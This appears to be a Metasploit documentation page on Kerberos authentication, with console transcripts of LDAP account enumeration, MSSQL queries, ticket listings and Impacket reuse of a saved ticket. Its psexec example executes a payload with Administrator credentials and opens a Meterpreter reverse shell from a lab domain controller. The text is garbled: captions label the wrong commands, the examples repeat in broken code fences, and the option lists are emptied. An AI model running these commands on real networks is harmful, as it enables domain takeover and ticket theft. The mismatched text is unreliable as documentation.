## Service Authentication 
### Examples
Open a WinRM session:
```msf
msf6 > use auxiliary/gather/ldap_query
msf6 auxiliary(gather/ldap_query) > run action=ENUM_ACCOUNTS rhost=192.168.123.13 username=Administrator password=p4$$w0rd ldap::auth=kerberos ldap::rhostname=dc3.demo.local domain=demo.local domaincontrollerrhost=192.168.123.13
[*] Running module against 192.168.123.13

[+] 192.168.123.13:88 - Received a valid TGT-Response
[*] 192.168.123.13:389 - TGT MIT Credential Cache ticket saved to /Users/user/.msf4/loot/20230118120714_default_192.168.123.13_mit.kerberos.cca_216797.bin
[+] 192.168.123.13:88 - Received a valid TGS-Response
[*] 192.168.123.13:389 - TGS MIT Credential Cache ticket saved to /Users/user/.msf4/loot/20230118120714_default_192.168.123.13_mit.kerberos.cca_638903.bin
[+] 192.168.123.13:88 - Received a valid delegation TGS-Response
[*] Discovering base DN automatically
[+] 192.168.123.13:389 Discovered base DN: DC=adf3,DC=local
CN=Administrator CN=Users DC=adf3 DC=local
==========================================

 Name                Attributes
 ----                ----------
 badpwdcount         0
 description         Built-in account for administering the computer/domain
 lastlogoff          1601-01-01 00:00:00 UTC
 lastlogon           2023-01-23 11:02:49 UTC
 logoncount          159
 memberof            CN=Group Policy Creator Owners,CN=Users,DC=domain,DC=local || CN=Domain Admins,CN=Users,DC=domain,DC=local |
                     | CN=Enterprise Admins,CN=Users,DC=domain,DC=local || CN=Schema Admins,CN=Users,DC=domain,DC=local || CN=Adm
                     inistrators,CN=Builtin,DC=domain,DC=local
 name                Administrator
 objectsid           S-1-5-21-3402587289-1488798532-3618296993-500
 pwdlastset          133189448681297271
 samaccountname      Administrator
 useraccountcontrol  512

 ... etc ...
```

Query LDAP for accounts:
```msf
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > run rhost=192.168.123.13 username=Administrator password=p4$$w0rd smb::auth=kerberos domaincontrollerrhost=192.168.123.13 smb::rhostname=dc3.demo.local domain=demo.local

[*] Started reverse TCP handler on 192.168.123.1:4444
[*] 192.168.123.13:445 - Connecting to the server...
[*] 192.168.123.13:445 - Authenticating to 192.168.123.13:445|demo.local as user 'Administrator'...
[+] 192.168.123.13:445 - 192.168.123.13:88 - Received a valid TGT-Response
[*] 192.168.123.13:445 - 192.168.123.13:445 - TGT MIT Credential Cache ticket saved to /Users/user/.msf4/loot/20230118120911_default_192.168.123.13_mit.kerberos.cca_474531.bin
[+] 192.168.123.13:445 - 192.168.123.13:88 - Received a valid TGS-Response
[*] 192.168.123.13:445 - 192.168.123.13:445 - TGS MIT Credential Cache ticket saved to /Users/user/.msf4/loot/20230118120911_default_192.168.123.13_mit.kerberos.cca_169149.bin
[+] 192.168.123.13:445 - 192.168.123.13:88 - Received a valid delegation TGS-Response
[*] 192.168.123.13:445 - Selecting PowerShell target
[*] 192.168.123.13:445 - Executing the payload...
[+] 192.168.123.13:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175686 bytes) to 192.168.123.13
[*] Meterpreter session 6 opened (192.168.123.1:4444 -> 192.168.123.13:49738) at 2023-01-18 12:09:13 +0000

meterpreter >
```

Running psexec against a host:
```msf
msf6 > use auxiliary/admin/mssql/mssql_sql
msf6 auxiliary(admin/mssql/mssql_sql) > run 192.168.123.13 domaincontrollerrhost=192.168.123.13 username=administrator password=p4$$w0rd mssql::auth=kerberos mssql::rhostname=dc3.demo.local mssqldomain=demo.local sql='select auth_scheme from sys.dm_exec_connections where session_id=@@spid'
[*] Reloading module...
[*] Running module against 192.168.123.13

[*] 192.168.123.13:1433 - 192.168.123.13:88 - Valid TGT-Response
[+] 192.168.123.13:1433 - 192.168.123.13:88 - Valid TGS-Response
[*] 192.168.123.13:1433 - 192.168.123.13:88 - TGS MIT Credential Cache saved to ~/.msf4/loot/20220630193907_default_192.168.123.13_windows.kerberos_556101.bin
[*] 192.168.123.13:1433 - SQL Query: select auth_scheme from sys.dm_exec_connections where session_id=@@spid
[*] 192.168.123.13:1433 - Row Count: 1 (Status: 16 Command: 193)

 auth_scheme
 -----------
 KERBEROS

[*] Auxiliary module execution completed
```

Connect to a Microsoft SQL Server instance and run a query:
```msf
msf6 > klist
Kerberos Cache
==============
host            principal               sname                              issued                     status       path
----            ---------               -----                              ------                     ------       ----
192.168.159.10  smcintyre@MSFLAB.LOCAL  krbtgt/MSFLAB.LOCAL@MSFLAB.LOCAL   2022-12-15 18:25:48 -0500  >>expired<<  /home/smcintyre/.msf4/loot/20221215182546_default_192.168.159.10_mit.kerberos.cca_867855.bin
192.168.159.10  smcintyre@MSFLAB.LOCAL  cifs/DC.msflab.local@MSFLAB.LOCAL  2022-12-15 18:25:48 -0500  >>expired<<  /home/smcintyre/.msf4/loot/20221215182546_default_192.168.159.10_mit.kerberos.cca_699376.bin
192.168.159.10  smcintyre@MSFLAB.LOCAL  krbtgt/msflab.local@MSFLAB.LOCAL   2022-12-16 14:51:50 -0500  valid        /home/smcintyre/.msf4/loot/20221216145149_default_192.168.159.10_mit.kerberos.cca_782487.bin
192.168.159.10  smcintyre@MSFLAB.LOCAL  cifs/DC.msflab.local@MSFLAB.LOCAL  2022-12-16 17:07:48 -0500  valid        /home/smcintyre/.msf4/loot/20221216170747_default_192.168.159.10_mit.kerberos.cca_156303.bin
192.168.159.10  smcintyre@MSFLAB.LOCAL  cifs/DC@MSFLAB.LOCAL               2022-12-16 17:08:26 -0500  valid        /home/smcintyre/.msf4/loot/20221216170825_default_192.168.159.10_mit.kerberos.cca_196712.bin
192.168.159.10  smcintyre@MSFLAB.LOCAL  krbtgt/msflab.local@MSFLAB.LOCAL   2022-12-16 15:03:03 -0500  valid        /home/smcintyre/.msf4/loot/20221216150302_default_192.168.159.10_mit.kerberos.cca_729805.bin
192.168.159.10  aliddle@MSFLAB.LOCAL    krbtgt/msflab.local@MSFLAB.LOCAL   2022-12-16 15:25:16 -0500  valid        /home/smcintyre/.msf4/loot/20221216152515_default_192.168.159.10_mit.kerberos.cca_934698.bin
```

### Options
## Ticket management
command can be used to view tickets. It is a top level command and can be run even if a module is in use.
```msf
msf6 auxiliary(admin/dcerpc/icpr_cert) > loot --type mit.kerberos.ccache

Loot
====

host            service  type                 name             content                   info                                                                  path
----            -------  ----                 ----             -------                   ----                                                                  ----
192.168.159.10           mit.kerberos.ccache                   application/octet-stream  realm: MSFLAB.LOCAL, client: smcintyre, server: krbtgt/msflab.local   /home/smcintyre/.msf4/loot/20221219105440_default_192.168.159.10_mit.kerberos.cca_905330.bin
192.168.159.10           mit.kerberos.ccache                   application/octet-stream  realm: MSFLAB.LOCAL, client: smcintyre, server: cifs/dc.msflab.local  /home/smcintyre/.msf4/loot/20221219105440_default_192.168.159.10_mit.kerberos.cca_539055.bin
```

More detailed information can be displayed by using the verbose (`-v` / `--verbose`) option.
```
[user@localhost]$ KRB5CCNAME=/home/smcintyre/.msf4/loot/20221219105440_default_192.168.159.10_mit.kerberos.cca_539055.bin \
  python examples/smbclient.py  dc.msflab.local -target-ip 192.168.159.10 -k
Impacket v0.9.22.dev1+20200327.103853.7e505892 - Copyright 2021 SecureAuth Corporation

Type help for list of commands
# info
Version Major: 10
Version Minor: 0
Server Name: DC
Server Comment:
Server UserPath: c:\
Simultaneous Users: 16777216
#
```

`msf
msf6 > use auxiliary/gather/ldap_query
msf6 auxiliary(gather/ldap_query) > run action=ENUM_ACCOUNTS rhost=192.168.123.13 username=Administrator password=p4$$w0rd ldap::auth=kerberos ldap::rhostname=dc3.demo.local domain=demo.local domaincontrollerrhost=192.168.123.13
[*] Running module against 192.168.123.13

[+] 192.168.123.13:88 - Received a valid TGT-Response
[*] 192.168.123.13:389 - TGT MIT Credential Cache ticket saved to /Users/user/.msf4/loot/20230118120714_default_192.168.123.13_mit.kerberos.cca_216797.bin
[+] 192.168.123.13:88 - Received a valid TGS-Response
[*] 192.168.123.13:389 - TGS MIT Credential Cache ticket saved to /Users/user/.msf4/loot/20230118120714_default_192.168.123.13_mit.kerberos.cca_638903.bin
[+] 192.168.123.13:88 - Received a valid delegation TGS-Response
[*] Discovering base DN automatically
[+] 192.168.123.13:389 Discovered base DN: DC=adf3,DC=local
CN=Administrator CN=Users DC=adf3 DC=local
==========================================

 Name                Attributes
 ----                ----------
 badpwdcount         0
 description         Built-in account for administering the computer/domain
 lastlogoff          1601-01-01 00:00:00 UTC
 lastlogon           2023-01-23 11:02:49 UTC
 logoncount          159
 memberof            CN=Group Policy Creator Owners,CN=Users,DC=domain,DC=local || CN=Domain Admins,CN=Users,DC=domain,DC=local |
                     | CN=Enterprise Admins,CN=Users,DC=domain,DC=local || CN=Schema Admins,CN=Users,DC=domain,DC=local || CN=Adm
                     inistrators,CN=Builtin,DC=domain,DC=local
 name                Administrator
 objectsid           S-1-5-21-3402587289-1488798532-3618296993-500
 pwdlastset          133189448681297271
 samaccountname      Administrator
 useraccountcontrol  512

 ... etc ...
`

`msf
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > run rhost=192.168.123.13 username=Administrator password=p4$$w0rd smb::auth=kerberos domaincontrollerrhost=192.168.123.13 smb::rhostname=dc3.demo.local domain=demo.local

[*] Started reverse TCP handler on 192.168.123.1:4444
[*] 192.168.123.13:445 - Connecting to the server...
[*] 192.168.123.13:445 - Authenticating to 192.168.123.13:445|demo.local as user 'Administrator'...
[+] 192.168.123.13:445 - 192.168.123.13:88 - Received a valid TGT-Response
[*] 192.168.123.13:445 - 192.168.123.13:445 - TGT MIT Credential Cache ticket saved to /Users/user/.msf4/loot/20230118120911_default_192.168.123.13_mit.kerberos.cca_474531.bin
[+] 192.168.123.13:445 - 192.168.123.13:88 - Received a valid TGS-Response
[*] 192.168.123.13:445 - 192.168.123.13:445 - TGS MIT Credential Cache ticket saved to /Users/user/.msf4/loot/20230118120911_default_192.168.123.13_mit.kerberos.cca_169149.bin
[+] 192.168.123.13:445 - 192.168.123.13:88 - Received a valid delegation TGS-Response
[*] 192.168.123.13:445 - Selecting PowerShell target
[*] 192.168.123.13:445 - Executing the payload...
[+] 192.168.123.13:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175686 bytes) to 192.168.123.13
[*] Meterpreter session 6 opened (192.168.123.1:4444 -> 192.168.123.13:49738) at 2023-01-18 12:09:13 +0000

meterpreter >
`

`msf
msf6 > use auxiliary/admin/mssql/mssql_sql
msf6 auxiliary(admin/mssql/mssql_sql) > run 192.168.123.13 domaincontrollerrhost=192.168.123.13 username=administrator password=p4$$w0rd mssql::auth=kerberos mssql::rhostname=dc3.demo.local mssqldomain=demo.local sql='select auth_scheme from sys.dm_exec_connections where session_id=@@spid'
[*] Reloading module...
[*] Running module against 192.168.123.13

[*] 192.168.123.13:1433 - 192.168.123.13:88 - Valid TGT-Response
[+] 192.168.123.13:1433 - 192.168.123.13:88 - Valid TGS-Response
[*] 192.168.123.13:1433 - 192.168.123.13:88 - TGS MIT Credential Cache saved to ~/.msf4/loot/20220630193907_default_192.168.123.13_windows.kerberos_556101.bin
[*] 192.168.123.13:1433 - SQL Query: select auth_scheme from sys.dm_exec_connections where session_id=@@spid
[*] 192.168.123.13:1433 - Row Count: 1 (Status: 16 Command: 193)

 auth_scheme
 -----------
 KERBEROS

[*] Auxiliary module execution completed
`

`

### Options

Kerberos authentication requires additional options to be set. Some of them are prefixed with the protocol the module
is authenticating. For example, the PSexec module which operates over SMB would use the "SMB" prefix.

Required options:
* `

`
* `

`
* `

`

Optional options:
* `

` option) SRV record in DNS.
* `

`.
* `

` -- Stored tickets from the cache will be used and new tickets will be stored for reuse.
* `

`msf
msf6 > klist
Kerberos Cache
==============
host            principal               sname                              issued                     status       path
----            ---------               -----                              ------                     ------       ----
192.168.159.10  smcintyre@MSFLAB.LOCAL  krbtgt/MSFLAB.LOCAL@MSFLAB.LOCAL   2022-12-15 18:25:48 -0500  >>expired<<  /home/smcintyre/.msf4/loot/20221215182546_default_192.168.159.10_mit.kerberos.cca_867855.bin
192.168.159.10  smcintyre@MSFLAB.LOCAL  cifs/DC.msflab.local@MSFLAB.LOCAL  2022-12-15 18:25:48 -0500  >>expired<<  /home/smcintyre/.msf4/loot/20221215182546_default_192.168.159.10_mit.kerberos.cca_699376.bin
192.168.159.10  smcintyre@MSFLAB.LOCAL  krbtgt/msflab.local@MSFLAB.LOCAL   2022-12-16 14:51:50 -0500  valid        /home/smcintyre/.msf4/loot/20221216145149_default_192.168.159.10_mit.kerberos.cca_782487.bin
192.168.159.10  smcintyre@MSFLAB.LOCAL  cifs/DC.msflab.local@MSFLAB.LOCAL  2022-12-16 17:07:48 -0500  valid        /home/smcintyre/.msf4/loot/20221216170747_default_192.168.159.10_mit.kerberos.cca_156303.bin
192.168.159.10  smcintyre@MSFLAB.LOCAL  cifs/DC@MSFLAB.LOCAL               2022-12-16 17:08:26 -0500  valid        /home/smcintyre/.msf4/loot/20221216170825_default_192.168.159.10_mit.kerberos.cca_196712.bin
192.168.159.10  smcintyre@MSFLAB.LOCAL  krbtgt/msflab.local@MSFLAB.LOCAL   2022-12-16 15:03:03 -0500  valid        /home/smcintyre/.msf4/loot/20221216150302_default_192.168.159.10_mit.kerberos.cca_729805.bin
192.168.159.10  aliddle@MSFLAB.LOCAL    krbtgt/msflab.local@MSFLAB.LOCAL   2022-12-16 15:25:16 -0500  valid        /home/smcintyre/.msf4/loot/20221216152515_default_192.168.159.10_mit.kerberos.cca_934698.bin
`

`msf
msf6 auxiliary(admin/dcerpc/icpr_cert) > loot --type mit.kerberos.ccache

Loot
====

host            service  type                 name             content                   info                                                                  path
----            -------  ----                 ----             -------                   ----                                                                  ----
192.168.159.10           mit.kerberos.ccache                   application/octet-stream  realm: MSFLAB.LOCAL, client: smcintyre, server: krbtgt/msflab.local   /home/smcintyre/.msf4/loot/20221219105440_default_192.168.159.10_mit.kerberos.cca_905330.bin
192.168.159.10           mit.kerberos.ccache                   application/octet-stream  realm: MSFLAB.LOCAL, client: smcintyre, server: cifs/dc.msflab.local  /home/smcintyre/.msf4/loot/20221219105440_default_192.168.159.10_mit.kerberos.cca_539055.bin
`

`
[user@localhost]$ KRB5CCNAME=/home/smcintyre/.msf4/loot/20221219105440_default_192.168.159.10_mit.kerberos.cca_539055.bin \
  python examples/smbclient.py  dc.msflab.local -target-ip 192.168.159.10 -k
Impacket v0.9.22.dev1+20200327.103853.7e505892 - Copyright 2021 SecureAuth Corporation

Type help for list of commands
# info
Version Major: 10
Version Minor: 0
Server Name: DC
Server Comment:
Server UserPath: c:\
Simultaneous Users: 16777216
#
`

